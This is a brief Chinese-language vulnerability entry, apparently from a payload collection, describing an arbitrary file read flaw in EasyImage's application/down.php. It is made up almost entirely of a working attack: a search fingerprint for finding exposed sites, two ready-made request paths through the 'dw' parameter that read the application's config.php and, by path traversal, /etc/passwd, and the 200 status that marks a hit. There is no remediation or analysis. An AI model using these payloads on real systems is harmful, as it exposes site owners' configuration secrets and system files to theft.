# EasyImagedown.php存在任意文件读取漏洞

EasyImagedown.php ｜ 任意文件读取/写入 ｜ —
- **指纹**：`"EasyImage"`

**Payload**
```
获取配置信息/application/down.php?dw=./config/config.php
读取passwd/application/down.php?dw=../../../etc/passwd
```
- **响应特征**：200